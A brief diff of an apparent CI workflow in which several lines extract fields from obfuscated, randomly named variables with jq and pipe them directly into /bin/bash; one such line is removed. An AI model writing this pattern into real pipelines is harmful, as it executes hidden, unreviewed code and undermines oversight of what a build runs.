@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$wfg4" | jq -r .qkft3 | /bin/bash
           echo $li6 | jq -r .ryb0 | /bin/bash
           printf '%s' "$rpzb136" | jq -r .wghyx1201 | /bin/bash
-          printf '%s' "$nez1" | jq -r .vhyp3 | /bin/bash
           echo $bluwh82063 | jq -r .ixgzh149 | /bin/bash
 
       - name: Store results
